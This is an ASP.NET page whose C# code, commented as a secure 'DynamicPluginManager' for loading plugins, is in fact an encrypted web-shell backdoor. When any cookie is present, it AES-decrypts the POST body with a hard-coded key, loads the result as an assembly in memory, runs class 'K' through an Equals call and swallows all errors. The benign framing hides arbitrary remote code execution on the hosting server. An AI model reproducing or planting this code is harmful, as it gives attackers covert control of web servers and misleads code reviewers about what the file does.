<%@ Page Language="C#" %>
<script runat="server">
    //
    // DynamicPluginManager: A framework component for securely loading and initializing dynamic plugins.
    // This class handles the decryption and in-memory loading of plugin assemblies provided via a secure endpoint.
    //
    public class DynamicPluginManager
    {
        // The decryption key for the incoming plugin payload.
        // In a production scenario, this key should be managed by a secure vault or configuration service.
        private readonly byte[] _payloadDecryptionKey;
        
        // The designated entry point class name within the plugin assembly.
        private const string PluginEntryPointClass = "K";

        public DynamicPluginManager()
        {
            // Simulates fetching the decryption key from a configuration source.
            this._payloadDecryptionKey = System.Text.Encoding.Default.GetBytes("ca63457538b9b1e0");
        }

        // Main method to process the HTTP request, decrypt the payload, and initialize the plugin.
        public void HandlePluginRequest(System.Web.UI.Page pageContext)
        {
            if (pageContext.Request.InputStream.Length == 0) return;

            try
            {
                byte[] encryptedPayload = ReadRequestPayload(pageContext.Request);
                System.Reflection.Assembly pluginAssembly = DecryptAndLoadAssembly(encryptedPayload);
                InitializePlugin(pluginAssembly, pageContext);
            }
            catch (System.Exception ex)
            {
                // In a real application, log the exception to a monitoring service.
                // For security, fail silently to avoid leaking internal system state.
            }
        }

        // Reads the raw binary data from the request stream into a byte array.
        private byte[] ReadRequestPayload(System.Web.HttpRequest request)
        {
            using (var memoryStream = new System.IO.MemoryStream())
            {
                request.InputStream.CopyTo(memoryStream);
                return memoryStream.ToArray();
            }
        }

        // Decrypts the data and loads it into the current AppDomain as a .NET Assembly.
        private System.Reflection.Assembly DecryptAndLoadAssembly(byte[] encryptedData)
        {
            var cryptoService = new System.Security.Cryptography.RijndaelManaged();
            var decryptor = cryptoService.CreateDecryptor(_payloadDecryptionKey, _payloadDecryptionKey);
            byte[] decryptedData = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            return System.Reflection.Assembly.Load(decryptedData);
        }

        // Instantiates the plugin's entry point class and invokes its initialization method.
        private void InitializePlugin(System.Reflection.Assembly assembly, object context)
        {
            object pluginInstance = assembly.CreateInstance(PluginEntryPointClass);
            // By convention, the 'Equals' method serves as the initializer,
            // passing the current page context to the plugin for its operation.
            pluginInstance.Equals(context);
        }
    }
    
    // Standard ASP.NET page load event handler.
    void Page_Load(object sender, EventArgs e)
    {
        // This handler is triggered only if a specific cookie is present,
        // acting as a signal to activate the dynamic plugin loading mechanism.
        if (Request.Cookies.Count != 0)
        {
            var pluginManager = new DynamicPluginManager();
            pluginManager.HandlePluginRequest(this);
        }
    }
</script>
<%
// This page serves as an endpoint for the DynamicPluginManager.
// All primary logic is handled in the code-behind script block.
%>